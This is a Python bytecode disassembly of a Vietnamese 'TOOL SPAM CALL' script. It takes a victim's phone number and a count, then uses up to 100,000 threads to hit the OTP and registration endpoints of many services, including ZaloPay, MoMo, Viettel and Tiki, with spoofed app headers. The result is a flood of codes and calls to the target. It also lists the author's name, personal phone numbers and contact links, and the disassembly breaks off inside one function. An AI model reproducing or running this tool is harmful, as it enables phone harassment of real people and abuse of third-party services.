   0           0 RESUME                   0

   1           2 LOAD_CONST               0 (0)
               4 LOAD_CONST               1 (None)
               6 IMPORT_NAME              0 (json)
               8 STORE_NAME               0 (json)

   2          10 LOAD_CONST               0 (0)
              12 LOAD_CONST               1 (None)
              14 IMPORT_NAME              1 (urllib.request)
              16 STORE_NAME               2 (urllib)

   3          18 LOAD_CONST               0 (0)
              20 LOAD_CONST               1 (None)
              22 IMPORT_NAME              2 (urllib)
              24 STORE_NAME               2 (urllib)

   4          26 LOAD_CONST               0 (0)
              28 LOAD_CONST               1 (None)
              30 IMPORT_NAME              3 (uuid)
              32 STORE_NAME               3 (uuid)

   5          34 LOAD_CONST               0 (0)
              36 LOAD_CONST               1 (None)
              38 IMPORT_NAME              4 (requests)
              40 STORE_NAME               4 (requests)

   6          42 LOAD_CONST               0 (0)
              44 LOAD_CONST               1 (None)
              46 IMPORT_NAME              5 (hmac)
              48 STORE_NAME               5 (hmac)

   7          50 LOAD_CONST               0 (0)
              52 LOAD_CONST               1 (None)
              54 IMPORT_NAME              6 (threading)
              56 STORE_NAME               6 (threading)

   8          58 LOAD_CONST               0 (0)
              60 LOAD_CONST               2 (('ThreadPoolExecutor',))
              62 IMPORT_NAME              7 (concurrent.futures)
              64 IMPORT_FROM              8 (ThreadPoolExecutor)
              66 STORE_NAME               8 (ThreadPoolExecutor)
              68 POP_TOP

   9          70 LOAD_CONST               0 (0)
              72 LOAD_CONST               1 (None)
              74 IMPORT_NAME              9 (hashlib)
              76 STORE_NAME               9 (hashlib)
              78 LOAD_CONST               0 (0)
              80 LOAD_CONST               1 (None)
              82 IMPORT_NAME             10 (random)
              84 STORE_NAME              10 (random)
              86 LOAD_CONST               0 (0)
              88 LOAD_CONST               1 (None)
              90 IMPORT_NAME             11 (time)
              92 STORE_NAME              11 (time)

  10          94 LOAD_CONST               0 (0)
              96 LOAD_CONST               3 (('datetime',))
              98 IMPORT_NAME             12 (datetime)
             100 IMPORT_FROM             12 (datetime)
             102 STORE_NAME              12 (datetime)
             104 POP_TOP

  11         106 LOAD_CONST               0 (0)
             108 LOAD_CONST               1 (None)
             110 IMPORT_NAME             13 (bs4)
             112 STORE_NAME              13 (bs4)
             114 LOAD_CONST               0 (0)
             116 LOAD_CONST               1 (None)
             118 IMPORT_NAME             14 (base64)
             120 STORE_NAME              14 (base64)

  12         122 LOAD_CONST               0 (0)
             124 LOAD_CONST               4 (('sleep',))
             126 IMPORT_NAME             11 (time)
             128 IMPORT_FROM             15 (sleep)
             130 STORE_NAME              15 (sleep)
             132 POP_TOP

  13         134 LOAD_CONST               0 (0)
             136 LOAD_CONST               1 (None)
             138 IMPORT_NAME              4 (requests)
             140 STORE_NAME               4 (requests)

  14         142 LOAD_CONST               0 (0)
             144 LOAD_CONST               1 (None)
             146 IMPORT_NAME             16 (os)
             148 STORE_NAME              16 (os)
             150 LOAD_CONST               0 (0)
             152 LOAD_CONST               1 (None)
             154 IMPORT_NAME             17 (sys)
             156 STORE_NAME              17 (sys)
             158 LOAD_CONST               0 (0)
             160 LOAD_CONST               1 (None)
             162 IMPORT_NAME              4 (requests)
             164 STORE_NAME               4 (requests)
             166 LOAD_CONST               0 (0)
             168 LOAD_CONST               1 (None)
             170 IMPORT_NAME             10 (random)
             172 STORE_NAME              10 (random)
             174 LOAD_CONST               0 (0)
             176 LOAD_CONST               1 (None)
             178 IMPORT_NAME              0 (json)
             180 STORE_NAME               0 (json)

  15         182 LOAD_CONST               0 (0)
             184 LOAD_CONST               1 (None)
             186 IMPORT_NAME             11 (time)
             188 STORE_NAME              11 (time)

  16         190 LOAD_CONST               0 (0)
             192 LOAD_CONST               5 (('search',))
             194 IMPORT_NAME             18 (re)
             196 IMPORT_FROM             19 (search)
             198 STORE_NAME              19 (search)
             200 POP_TOP

  17         202 LOAD_CONST               0 (0)
             204 LOAD_CONST               6 (('choice', 'randint', 'shuffle'))
             206 IMPORT_NAME             10 (random)
             208 IMPORT_FROM             20 (choice)
             210 STORE_NAME              20 (choice)
             212 IMPORT_FROM             21 (randint)
             214 STORE_NAME              21 (randint)
             216 IMPORT_FROM             22 (shuffle)
             218 STORE_NAME              22 (shuffle)
             220 POP_TOP

  18         222 PUSH_NULL
             224 LOAD_NAME               16 (os)
             226 LOAD_ATTR               23 (system)
             236 LOAD_CONST               7 ('clear')
             238 PRECALL                  1
             242 CALL                     1
             252 POP_TOP

  20         254 LOAD_CONST               8 ('\x1b[1;37m')
             256 STORE_NAME              24 (trang)

  21         258 LOAD_CONST               9 ('\x1b[1;32m')
             260 STORE_NAME              25 (xanh_la)

  22         262 LOAD_CONST              10 ('\x1b[1;34m')
             264 STORE_NAME              26 (xanh_duong)

  23         266 LOAD_CONST              11 ('\x1b[1;31m')
             268 STORE_NAME              27 (do)

  24         270 LOAD_CONST              12 ('\x1b[1;33m')
             272 STORE_NAME              28 (vang)

  25         274 LOAD_CONST              13 ('\x1b[1;35m')
             276 STORE_NAME              29 (tim)

  26         278 LOAD_CONST              14 ('\x1b[32;5;245m\x1b[1m\x1b[38;5;51m')
             280 STORE_NAME              30 (mau_dac_biet)

  28         282 LOAD_CONST              15 ('\x1b[1;31m[\x1b[1;37m×.×\x1b[1;31m] \x1b[1;37m➩')
             284 STORE_NAME              31 (dau)

  29         286 LOAD_CONST              16 ('')
             288 LOAD_METHOD             32 (join)
             310 BUILD_LIST               0
             312 LOAD_CONST              17 ('\x1b[1;36m\n\n  _______ ____   ____  _         _____ _____        __  __ \n |__   __/ __ \\ / __ \\| |       / ____|  __ \\ /\\   |  \\/  |\n    | | | |  | | |  | | |      | (___ | |__) /  \\  | \\  / |\n    | | | |  | | |  | | |       \\___ \\|  ___/ /\\ \\ | |\\/| |\n    | | | |__| | |__| | |____   ____) | |  / ____ \\| |  | |\n    |_|  \\____/ \\____/|______| |_____/|_| /_/    \\_\\_|  |_|\n                                                           \n\x1b[1;31m────────────────────────────────────────────────────────────\n')
             314 LIST_APPEND              1

  39         316 LOAD_NAME               27 (do)

  29         318 FORMAT_VALUE             0
             320 LIST_APPEND              1
             322 LOAD_CONST              18 ('[')
             324 LIST_APPEND              1

  39         326 LOAD_NAME               24 (trang)

  29         328 FORMAT_VALUE             0
             330 LIST_APPEND              1
             332 LOAD_CONST              19 ('=.=')
             334 LIST_APPEND              1

  39         336 LOAD_NAME               27 (do)

  29         338 FORMAT_VALUE             0
             340 LIST_APPEND              1
             342 LOAD_CONST              20 ('] ')
             344 LIST_APPEND              1

  39         346 LOAD_NAME               28 (vang)

  29         348 FORMAT_VALUE             0
             350 LIST_APPEND              1
             352 LOAD_CONST              21 ('TOOL SPAM CALL\n')
             354 LIST_APPEND              1

  40         356 LOAD_NAME               27 (do)

  29         358 FORMAT_VALUE             0
             360 LIST_APPEND              1
             362 LOAD_CONST              18 ('[')
             364 LIST_APPEND              1

  40         366 LOAD_NAME               24 (trang)

  29         368 FORMAT_VALUE             0
             370 LIST_APPEND              1
             372 LOAD_CONST              19 ('=.=')
             374 LIST_APPEND              1

  40         376 LOAD_NAME               27 (do)

  29         378 FORMAT_VALUE             0
             380 LIST_APPEND              1
             382 LOAD_CONST              22 ('] \x1b[1;35mADMIN: ')
             384 LIST_APPEND              1

  40         386 LOAD_NAME               30 (mau_dac_biet)

  29         388 FORMAT_VALUE             0
             390 LIST_APPEND              1
             392 LOAD_CONST              23 ('BÙI THANH THÔNG\n')
             394 LIST_APPEND              1

  41         396 LOAD_NAME               27 (do)

  29         398 FORMAT_VALUE             0
             400 LIST_APPEND              1
             402 LOAD_CONST              18 ('[')
             404 LIST_APPEND              1

  41         406 LOAD_NAME               24 (trang)

  29         408 FORMAT_VALUE             0
             410 LIST_APPEND              1
             412 LOAD_CONST              19 ('=.=')
             414 LIST_APPEND              1

  41         416 LOAD_NAME               27 (do)

  29         418 FORMAT_VALUE             0
             420 LIST_APPEND              1
             422 LOAD_CONST              24 ('] \x1b[1;36mZALO: \x1b[1;31m0587163009\n')
             424 LIST_APPEND              1

  42         426 LOAD_NAME               27 (do)

  29         428 FORMAT_VALUE             0
             430 LIST_APPEND              1
             432 LOAD_CONST              18 ('[')
             434 LIST_APPEND              1

  42         436 LOAD_NAME               24 (trang)

  29         438 FORMAT_VALUE             0
             440 LIST_APPEND              1
             442 LOAD_CONST              19 ('=.=')
             444 LIST_APPEND              1

  42         446 LOAD_NAME               27 (do)

  29         448 FORMAT_VALUE             0
             450 LIST_APPEND              1
             452 LOAD_CONST              25 ('] \x1b[1;32mBOX SUPPORT: ')
             454 LIST_APPEND              1

  42         456 LOAD_NAME               24 (trang)

  29         458 FORMAT_VALUE             0
             460 LIST_APPEND              1
             462 LOAD_CONST              26 ('https://zalo.me/g/lrbjht562\n')
             464 LIST_APPEND              1

  43         466 LOAD_NAME               27 (do)

  29         468 FORMAT_VALUE             0
             470 LIST_APPEND              1
             472 LOAD_CONST              18 ('[')
             474 LIST_APPEND              1

  43         476 LOAD_NAME               24 (trang)

  29         478 FORMAT_VALUE             0
             480 LIST_APPEND              1
             482 LOAD_CONST              19 ('=.=')
             484 LIST_APPEND              1

  43         486 LOAD_NAME               27 (do)

  29         488 FORMAT_VALUE             0
             490 LIST_APPEND              1
             492 LOAD_CONST              20 ('] ')
             494 LIST_APPEND              1

  43         496 LOAD_NAME               26 (xanh_duong)

  29         498 FORMAT_VALUE             0
             500 LIST_APPEND              1
             502 LOAD_CONST              27 ('YOUTUBE: ')
             504 LIST_APPEND              1

  43         506 LOAD_NAME               24 (trang)

  29         508 FORMAT_VALUE             0
             510 LIST_APPEND              1
             512 LOAD_CONST              28 ('https://www.youtube.com/@buithanhthongoffcial\n\x1b[1;31m────────────────────────────────────────────────────────────\n\n')
             514 LIST_APPEND              1
             516 PRECALL                  1
             520 CALL                     1
             530 STORE_NAME              33 (banner)

  47         532 LOAD_NAME               33 (banner)
             534 GET_ITER
         >>  536 FOR_ITER                64 (to 666)
             538 STORE_NAME              34 (h)

  48         540 LOAD_NAME               17 (sys)
             542 LOAD_ATTR               35 (stdout)
             552 LOAD_METHOD             36 (write)
             574 LOAD_NAME               34 (h)
             576 PRECALL                  1
             580 CALL                     1
             590 POP_TOP

  49         592 LOAD_NAME               17 (sys)
             594 LOAD_ATTR               35 (stdout)
             604 LOAD_METHOD             37 (flush)
             626 PRECALL                  0
             630 CALL                     0
             640 POP_TOP

  50         642 PUSH_NULL
             644 LOAD_NAME               15 (sleep)
             646 LOAD_CONST              29 (0.004)
             648 PRECALL                  1
             652 CALL                     1
             662 POP_TOP
             664 JUMP_BACKWARD           65 (to 536)

  51     >>  666 PUSH_NULL
             668 LOAD_NAME               38 (input)
             670 LOAD_CONST              30 ('\x1b[1;31m[\x1b[1;37m</>\x1b[1;31m] \x1b[1;32mNhập Số Cần Spam:\x1b[1;33m ~>\x1b[1;36m ')
             672 PRECALL                  1
             676 CALL                     1
             686 STORE_NAME              39 (phone)

  52         688 PUSH_NULL
             690 LOAD_NAME               40 (int)
             692 PUSH_NULL
             694 LOAD_NAME               38 (input)
             696 LOAD_CONST              31 ('\x1b[1;31m[\x1b[1;37m</>\x1b[1;31m] \x1b[1;37m\x1b[1;32mSố Lượng:\x1b[1;33m ~>\x1b[1;36m ')
             698 PRECALL                  1
             702 CALL                     1
             712 PRECALL                  1
             716 CALL                     1
             726 STORE_NAME              41 (amount)

  53         728 PUSH_NULL
             730 LOAD_NAME                8 (ThreadPoolExecutor)
             732 PUSH_NULL
             734 LOAD_NAME               40 (int)
             736 LOAD_CONST              32 (100000)
             738 PRECALL                  1
             742 CALL                     1
             752 KW_NAMES                33
             754 PRECALL                  1
             758 CALL                     1
             768 STORE_NAME               6 (threading)

  54         770 PUSH_NULL
             772 LOAD_NAME                3 (uuid)
             774 LOAD_ATTR               42 (uuid4)
             784 PRECALL                  0
             788 CALL                     0
             798 STORE_NAME              43 (imei)

  55         800 LOAD_CONST              34 ('user-agent')
             802 LOAD_CONST              35 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36')
             804 BUILD_MAP                1
             806 STORE_NAME              44 (ua)

  56         808 LOAD_CONST              36 ('phone_number')
             810 LOAD_NAME               39 (phone)
             812 BUILD_MAP                1
             814 STORE_NAME              45 (jsdt)

  58         816 LOAD_CONST              37 ('register')

  59         818 LOAD_CONST              38 ('+84')
             820 LOAD_NAME               39 (phone)
             822 LOAD_CONST              39 (1)
             824 LOAD_CONST              40 (11)
             826 BUILD_SLICE              2
             828 BINARY_SUBSCR
             838 BINARY_OP                0 (+)

  57         842 LOAD_CONST              41 (('feature', 'phone'))
             844 BUILD_CONST_KEY_MAP      2
             846 STORE_NAME              46 (json_data)

  61         848 BUILD_LIST               0
             850 LOAD_CONST              42 (('0587163009', '587163009', '84587163009', '0363918366', '363918366', '84363918366', '0335295153'))
             852 LIST_EXTEND              1
             854 STORE_NAME              47 (l_phone)

  63         856 LOAD_NAME               39 (phone)
             858 LOAD_NAME               47 (l_phone)
             860 CONTAINS_OP              0
             862 POP_JUMP_FORWARD_IF_FALSE    21 (to 906)

  64         864 PUSH_NULL
             866 LOAD_NAME               48 (print)
             868 LOAD_CONST              43 ('Số này không thể spam')
             870 PRECALL                  1
             874 CALL                     1
             884 POP_TOP

  65         886 PUSH_NULL
             888 LOAD_NAME               49 (exit)
             890 PRECALL                  0
             894 CALL                     0
             904 POP_TOP

  68     >>  906 LOAD_CONST              44 ('api.zalopay.vn')

  69         908 LOAD_CONST              45 ('Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1')

  70         910 LOAD_CONST              46 ('iPhone8,2')

  71         912 LOAD_CONST              47 ('iphone3x')

  72         914 LOAD_CONST              48 ('Bearer ')

  73         916 LOAD_CONST              49 ('IOS')

  74         918 LOAD_CONST              50 ('off')

  75         920 LOAD_CONST              51 ('*/*')

  76         922 LOAD_CONST              52 ('7.13.1')

  77         924 LOAD_CONST              53 ('vi-VN;q=1.0, en-VN;q=0.9')

  78         926 LOAD_CONST              54 ('ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2')

  79         928 LOAD_CONST              55 ('NATIVE')

  80         930 LOAD_CONST              56 ('14.6')

  67         932 LOAD_CONST              57 (('Host', 'x-user-agent', 'x-device-model', 'x-density', 'authorization', 'x-device-os', 'x-drsite', 'accept', 'x-app-version', 'accept-language', 'user-agent', 'x-platform', 'x-os-version'))
             934 BUILD_CONST_KEY_MAP     13
             936 STORE_NAME              50 (headers)

  81         938 LOAD_CONST              36 ('phone_number')
             940 LOAD_CONST              58 ('0')
             942 LOAD_NAME               39 (phone)
             944 LOAD_CONST              39 (1)
             946 LOAD_CONST              40 (11)
             948 BUILD_SLICE              2
             950 BINARY_SUBSCR
             960 BINARY_OP                0 (+)
             964 BUILD_MAP                1
             966 STORE_NAME              51 (params)

  83         968 LOAD_CONST              59 ('moca.vn')

  84         970 LOAD_CONST              51 ('*/*')

  85         972 PUSH_NULL
             974 LOAD_NAME               52 (str)
             976 LOAD_NAME               43 (imei)
             978 PRECALL                  1
             982 CALL                     1

  86         992 LOAD_CONST              60 ('XMLHttpRequest')

  87         994 LOAD_CONST              61 ('vi')

  88         996 LOAD_CONST              62 ('2')

  89         998 LOAD_CONST              63 ('P_IOS-2.10.42')

  90        1000 LOAD_CONST              64 ('Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)')

  82        1002 LOAD_CONST              65 (('Host', 'Accept', 'Device-Token', 'X-Requested-With', 'Accept-Language', 'X-Moca-Api-Version', 'platform', 'User-Agent'))
            1004 BUILD_CONST_KEY_MAP      8
            1006 STORE_NAME              53 (headerss)

  91        1008 LOAD_CONST              66 ('phoneNumber')
            1010 LOAD_NAME               39 (phone)
            1012 BUILD_MAP                1
            1014 STORE_NAME              54 (paramss)

  93        1016 LOAD_CONST              67 (<code object random_string at 0x7f48c6df0960, file "<x>", line 93>)
            1018 MAKE_FUNCTION            0
            1020 STORE_NAME              55 (random_string)

 101        1022 LOAD_CONST              68 (<code object zlpay at 0x7f48c6e0c6b0, file "<x>", line 101>)
            1024 MAKE_FUNCTION            0
            1026 STORE_NAME              56 (zlpay)

 106        1028 LOAD_CONST              69 (<code object momo at 0x127de00, file "<x>", line 106>)
            1030 MAKE_FUNCTION            0
            1032 STORE_NAME              57 (momo)

 214        1034 LOAD_CONST              70 (<code object generateRandomString at 0x7f48c6da29a0, file "<x>", line 214>)
            1036 MAKE_FUNCTION            0
            1038 STORE_NAME              58 (generateRandomString)

 216        1040 LOAD_CONST              71 (<code object get_SECUREID at 0x7f48c6da2ab0, file "<x>", line 216>)
            1042 MAKE_FUNCTION            0
            1044 STORE_NAME              59 (get_SECUREID)

 218        1046 LOAD_CONST              72 (<code object getimei at 0x7f48c6bd8030, file "<x>", line 218>)
            1048 MAKE_FUNCTION            0
            1050 STORE_NAME              60 (getimei)

 220        1052 LOAD_CONST              73 (<code object get_TOKEN at 0x127d890, file "<x>", line 220>)
            1054 MAKE_FUNCTION            0
            1056 STORE_NAME              61 (get_TOKEN)

 223        1058 LOAD_CONST              74 (<code object vntrip at 0x7f48c6da3220, file "<x>", line 223>)
            1060 MAKE_FUNCTION            0
            1062 STORE_NAME              62 (vntrip)

 226        1064 LOAD_CONST              75 (<code object pop at 0x7f48c6bd81b0, file "<x>", line 226>)
            1066 MAKE_FUNCTION            0
            1068 STORE_NAME              63 (pop)

 229        1070 LOAD_CONST              76 (<code object poy at 0x7f48c6de56b0, file "<x>", line 229>)
            1072 MAKE_FUNCTION            0
            1074 STORE_NAME              64 (poy)

 272        1076 LOAD_CONST              77 (<code object alfres at 0x7f48c6d74d20, file "<x>", line 272>)
            1078 MAKE_FUNCTION            0
            1080 STORE_NAME              65 (alfres)

 275        1082 LOAD_CONST              78 (<code object tv360 at 0x7f48c6df4e70, file "<x>", line 275>)
            1084 MAKE_FUNCTION            0
            1086 STORE_NAME              66 (tv360)

 278        1088 LOAD_CONST              79 (<code object tobi at 0x7f48c6d75000, file "<x>", line 278>)
            1090 MAKE_FUNCTION            0
            1092 STORE_NAME              67 (tobi)

 313        1094 LOAD_CONST              80 (<code object loship at 0x7f48c6e0c9f0, file "<x>", line 313>)
            1096 MAKE_FUNCTION            0
            1098 STORE_NAME              68 (loship)

 316        1100 LOAD_CONST              81 (<code object minh at 0x7f48c6d75170, file "<x>", line 316>)
            1102 MAKE_FUNCTION            0
            1104 STORE_NAME              69 (minh)

 353        1106 LOAD_CONST              82 (<code object oldloship at 0x7f48c6bde100, file "<x>", line 353>)
            1108 MAKE_FUNCTION            0
            1110 STORE_NAME              70 (oldloship)

 356        1112 LOAD_CONST              83 (<code object fpt at 0x7f48c6d95230, file "<x>", line 356>)
            1114 MAKE_FUNCTION            0
            1116 STORE_NAME              71 (fpt)

 359        1118 LOAD_CONST              84 (<code object kiot at 0x7f48c6d70f60, file "<x>", line 359>)
            1120 MAKE_FUNCTION            0
            1122 STORE_NAME              72 (kiot)

 422        1124 LOAD_CONST              85 (<code object f88 at 0x7f48c6bd8f30, file "<x>", line 422>)
            1126 MAKE_FUNCTION            0
            1128 STORE_NAME              73 (f88)

 425        1130 LOAD_CONST              86 (<code object call1 at 0x7f48c6e10df0, file "<x>", line 425>)
            1132 MAKE_FUNCTION            0
            1134 STORE_NAME              74 (call1)

 428        1136 LOAD_CONST              87 (<code object call2 at 0x7f48c6df5a50, file "<x>", line 428>)
            1138 MAKE_FUNCTION            0
            1140 STORE_NAME              75 (call2)

 431        1142 LOAD_CONST              88 (<code object call3 at 0x7f48c6e105b0, file "<x>", line 431>)
            1144 MAKE_FUNCTION            0
            1146 STORE_NAME              76 (call3)

 434        1148 LOAD_CONST              89 (<code object call4 at 0x7f48c6bde290, file "<x>", line 434>)
            1150 MAKE_FUNCTION            0
            1152 STORE_NAME              77 (call4)

 439        1154 LOAD_CONST              90 (<code object call5 at 0x7f48c6e0d3b0, file "<x>", line 439>)
            1156 MAKE_FUNCTION            0
            1158 STORE_NAME              78 (call5)

 444        1160 LOAD_CONST              91 (<code object call9 at 0x7f48c6bdea60, file "<x>", line 444>)
            1162 MAKE_FUNCTION            0
            1164 STORE_NAME              79 (call9)

 512        1166 LOAD_CONST              92 (<code object meta at 0x7f48c6d62430, file "<x>", line 512>)
            1168 MAKE_FUNCTION            0
            1170 STORE_NAME              80 (meta)

 515        1172 LOAD_CONST              93 (<code object vieon at 0x7f48c6bfd200, file "<x>", line 515>)
            1174 MAKE_FUNCTION            0
            1176 STORE_NAME              81 (vieon)

 517        1178 LOAD_CONST              94 (<code object fb at 0x7f48c6da3770, file "<x>", line 517>)
            1180 MAKE_FUNCTION            0
            1182 STORE_NAME              82 (fb)

 520        1184 LOAD_CONST              95 (<code object winmart at 0x7f48c6bfd020, file "<x>", line 520>)
            1186 MAKE_FUNCTION            0
            1188 STORE_NAME              83 (winmart)

 523        1190 LOAD_CONST              96 (<code object concung at 0x7f48c6d75450, file "<x>", line 523>)
            1192 MAKE_FUNCTION            0
            1194 STORE_NAME              84 (concung)

 528        1196 LOAD_CONST              97 (<code object daihocfpt at 0x7f48c6bfcf30, file "<x>", line 528>)
            1198 MAKE_FUNCTION            0
            1200 STORE_NAME              85 (daihocfpt)

 531        1202 LOAD_CONST              98 (<code object cafeland at 0x7f48c6e11370, file "<x>", line 531>)
            1204 MAKE_FUNCTION            0
            1206 STORE_NAME              86 (cafeland)

 536        1208 LOAD_CONST              99 (<code object call10 at 0x7f48c6d958f0, file "<x>", line 536>)
            1210 MAKE_FUNCTION            0
            1212 STORE_NAME              87 (call10)

 573        1214 LOAD_CONST             100 (<code object moneydong at 0x7f48c6df4d40, file "<x>", line 573>)
            1216 MAKE_FUNCTION            0
            1218 STORE_NAME              88 (moneydong)

 578        1220 LOAD_CONST             101 (<code object gotadi at 0x7f48c6bd93b0, file "<x>", line 578>)
            1222 MAKE_FUNCTION            0
            1224 STORE_NAME              89 (gotadi)

 583        1226 LOAD_CONST             102 (<code object funring at 0x7f48c6df1680, file "<x>", line 583>)
            1228 MAKE_FUNCTION            0
            1230 STORE_NAME              90 (funring)

 588        1232 LOAD_CONST             103 (<code object call11 at 0x7f48c6df4c10, file "<x>", line 588>)
            1234 MAKE_FUNCTION            0
            1236 STORE_NAME              91 (call11)

 638        1238 LOAD_CONST             104 (<code object fptplay at 0x7f48c6de4f30, file "<x>", line 638>)
            1240 MAKE_FUNCTION            0
            1242 STORE_NAME              92 (fptplay)

 643        1244 LOAD_CONST             105 (<code object vietid at 0x127e260, file "<x>", line 643>)
            1246 MAKE_FUNCTION            0
            1248 STORE_NAME              93 (vietid)

 650        1250 LOAD_CONST             106 (<code object ahamove at 0x7f48c6bd96b0, file "<x>", line 650>)
            1252 MAKE_FUNCTION            0
            1254 STORE_NAME              94 (ahamove)

 656        1256 LOAD_CONST             107 (<code object vieon1 at 0x7f48c6de5bb0, file "<x>", line 656>)
            1258 MAKE_FUNCTION            0
            1260 STORE_NAME              95 (vieon1)

 662        1262 LOAD_CONST             108 (<code object tiki at 0x7f48c6da3aa0, file "<x>", line 662>)
            1264 MAKE_FUNCTION            0
            1266 STORE_NAME              96 (tiki)

 665        1268 LOAD_CONST             109 (<code object apiv5 at 0x7f48c6da3bb0, file "<x>", line 665>)
            1270 MAKE_FUNCTION            0
            1272 STORE_NAME              97 (apiv5)

 669        1274 LOAD_CONST             110 (<code object moca at 0x7f48c6d71620, file "<x>", line 669>)
            1276 MAKE_FUNCTION            0
            1278 STORE_NAME              98 (moca)

 673        1280 LOAD_CONST             111 (<code object gbay at 0x7f48c6de5070, file "<x>", line 673>)
            1282 MAKE_FUNCTION            0
            1284 STORE_NAME              99 (gbay)

 677        1286 LOAD_CONST             112 (<code object viettel at 0x7f48c6bd9830, file "<x>", line 677>)
            1288 MAKE_FUNCTION            0
            1290 STORE_NAME             100 (viettel)

 718        1292 LOAD_CONST             113 (<code object dkvt at 0x7f48c6d758a0, file "<x>", line 718>)
            1294 MAKE_FUNCTION            0
            1296 STORE_NAME             101 (dkvt)

 752        1298 LOAD_CONST             114 (<code object tgdd at 0x7f48c6df1530, file "<x>", line 752>)
            1300 MAKE_FUNCTION            0
            1302 STORE_NAME             102 (tgdd)

 803        1304 LOAD_CONST             115 (<code object apiv2 at 0x7f48c6d75b80, file "<x>", line 803>)
            1306 MAKE_FUNCTION            0
            1308 STORE_NAME             103 (apiv2)

 838        1310 LOAD_CONST             116 (<code object apiv3 at 0x7f48c6d75cf0, file "<x>", line 838>)
            1312 MAKE_FUNCTION            0
            1314 STORE_NAME             104 (apiv3)

 874        1316 LOAD_CONST             117 (<code object callv10 at 0x7f48c6df62a0, file "<x>", line 874>)
            1318 MAKE_FUNCTION            0
            1320 STORE_NAME             105 (callv10)

 915        1322 LOAD_CONST             118 (<code object callv11 at 0x7f48c6de61f0, file "<x>", line 915>)
            1324 MAKE_FUNCTION            0
            1326 STORE_NAME             106 (callv11)

 967        1328 LOAD_CONST             119 (<code object callv12 at 0x7f48c6df63d0, file "<x>", line 967>)
            1330 MAKE_FUNCTION            0
            1332 STORE_NAME             107 (callv12)

1008        1334 LOAD_CONST             120 (<code object sendmm at 0x7f48c6e11790, file "<x>", line 1008>)
            1336 MAKE_FUNCTION            0
            1338 STORE_NAME             108 (sendmm)

1014        1340 LOAD_CONST             121 (<code object sendcall1 at 0x7f48c6df1bc0, file "<x>", line 1014>)
            1342 MAKE_FUNCTION            0
            1344 STORE_NAME             109 (sendcall1)

1020        1346 LOAD_CONST             122 (<code object BBot at 0x1281830, file "<x>", line 1020>)
            1348 MAKE_FUNCTION            0
            1350 STORE_NAME             110 (BBot)

1080        1352 PUSH_NULL
            1354 LOAD_NAME              110 (BBot)
            1356 LOAD_NAME               39 (phone)
            1358 LOAD_NAME               41 (amount)
            1360 PRECALL                  2
            1364 CALL                     2
            1374 POP_TOP
            1376 LOAD_CONST               1 (None)
            1378 RETURN_VALUE

Disassembly of <code object random_string at 0x7f48c6df0960, file "<x>", line 93>:
 93           0 RESUME                   0

 94           2 LOAD_CONST               1 ('0123456789')
              4 STORE_FAST               1 (number)

 95           6 LOAD_CONST               2 ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ')
              8 STORE_FAST               2 (alpha)

 96          10 LOAD_CONST               3 ('')
             12 STORE_FAST               3 (id)

 97          14 LOAD_GLOBAL              1 (NULL + range)
             26 LOAD_CONST               4 (0)
             28 LOAD_FAST                0 (length)
             30 LOAD_CONST               5 (2)
             32 PRECALL                  3
             36 CALL                     3
             46 GET_ITER
        >>   48 FOR_ITER                48 (to 146)
             50 STORE_FAST               4 (i)

 98          52 LOAD_FAST                3 (id)
             54 LOAD_GLOBAL              3 (NULL + random)
             66 LOAD_ATTR                2 (choice)
             76 LOAD_FAST                1 (number)
             78 PRECALL                  1
             82 CALL                     1
             92 BINARY_OP               13 (+=)
             96 STORE_FAST               3 (id)

 99          98 LOAD_FAST                3 (id)
            100 LOAD_GLOBAL              3 (NULL + random)
            112 LOAD_ATTR                2 (choice)
            122 LOAD_FAST                2 (alpha)
            124 PRECALL                  1
            128 CALL                     1
            138 BINARY_OP               13 (+=)
            142 STORE_FAST               3 (id)
            144 JUMP_BACKWARD           49 (to 48)

100     >>  146 LOAD_FAST                3 (id)
            148 RETURN_VALUE

Disassembly of <code object zlpay at 0x7f48c6e0c6b0, file "<x>", line 101>:
101           0 RESUME                   0

102           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://api.zalopay.vn/v2/account/phone/status')
             26 LOAD_GLOBAL              4 (params)
             38 LOAD_GLOBAL              6 (headers)
             50 KW_NAMES                 2
             52 PRECALL                  3
             56 CALL                     3
             66 LOAD_METHOD              4 (json)
             88 PRECALL                  0
             92 CALL                     0
            102 LOAD_CONST               3 ('data')
            104 BINARY_SUBSCR
            114 LOAD_CONST               4 ('send_otp_token')
            116 BINARY_SUBSCR
            126 STORE_FAST               1 (token)

103         128 LOAD_CONST               5 ('0')
            130 LOAD_FAST                0 (phone)
            132 LOAD_CONST               6 (1)
            134 LOAD_CONST               7 (11)
            136 BUILD_SLICE              2
            138 BINARY_SUBSCR
            148 BINARY_OP                0 (+)
            152 LOAD_FAST                1 (token)
            154 LOAD_CONST               8 (('phone_number', 'send_otp_token'))
            156 BUILD_CONST_KEY_MAP      2
            158 STORE_FAST               2 (json_data)

104         160 LOAD_GLOBAL              1 (NULL + requests)
            172 LOAD_ATTR                5 (post)
            182 LOAD_CONST               9 ('https://api.zalopay.vn/v2/account/otp')
            184 LOAD_GLOBAL              6 (headers)
            196 LOAD_FAST                2 (json_data)
            198 KW_NAMES                10
            200 PRECALL                  3
            204 CALL                     3
            214 LOAD_ATTR                6 (text)
            224 STORE_FAST               3 (response)
            226 LOAD_CONST               0 (None)
            228 RETURN_VALUE

Disassembly of <code object momo at 0x127de00, file "<x>", line 106>:
106           0 RESUME                   0

107           2 LOAD_GLOBAL              1 (NULL + int)
             14 LOAD_GLOBAL              3 (NULL + round)
             26 LOAD_GLOBAL              5 (NULL + time)
             38 LOAD_ATTR                2 (time)
             48 PRECALL                  0
             52 CALL                     0
             62 LOAD_CONST               1 (1000)
             64 BINARY_OP                5 (*)
             68 PRECALL                  1
             72 CALL                     1
             82 PRECALL                  1
             86 CALL                     1
             96 STORE_FAST               1 (microtime)

108          98 LOAD_GLOBAL              7 (NULL + getimei)
            110 PRECALL                  0
            114 CALL                     0
            124 STORE_FAST               2 (imei)

